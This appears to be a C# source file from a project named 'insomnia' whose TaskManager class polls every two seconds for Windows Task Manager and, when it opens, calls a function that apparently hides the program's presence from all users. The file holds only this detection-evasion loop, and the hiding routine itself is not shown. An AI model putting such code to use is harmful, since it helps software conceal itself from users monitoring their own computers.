using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Threading;

namespace insomnia
{
    internal class TaskManager
    {
        public static void Monitor()
        {
            int taskID = 0;
            int lastID = 0;

            while (true)
            {
                try
                {
                    taskID = Process.GetProcessesByName("taskmgr")[0].Id;

                    if (taskID != lastID)
                    {
                        Functions.DisableShowFromAllUsers();
                        lastID = taskID;
                    }
                }
                catch
                {
                }
                Thread.Sleep(2000);
            }
        }
    }
}
